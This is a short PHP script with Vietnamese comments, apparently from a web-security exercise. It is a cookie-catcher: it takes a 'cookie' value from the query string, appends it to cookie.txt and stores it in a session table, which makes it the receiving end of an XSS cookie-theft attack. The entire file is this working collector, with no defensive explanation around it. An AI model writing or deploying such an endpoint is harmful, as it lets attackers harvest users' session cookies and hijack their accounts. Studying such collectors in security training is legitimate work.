<?php
require_once 'models/UserModel.php';
if(isset($_GET['cookie']))
{
    $userModel = new UserModel();
    $cookie = $_GET['cookie'];

    $openWrite =fopen('cookie.txt','a');
    // Ghi giá trị cookie
    fwrite($openWrite,".Cookie la: ".$cookie." \n");
    // Đóng file lại
    fclose($openWrite);

    // Chèn dữ liệu vào bảng session
    $userModel->insertSession($_GET['cookie']);
}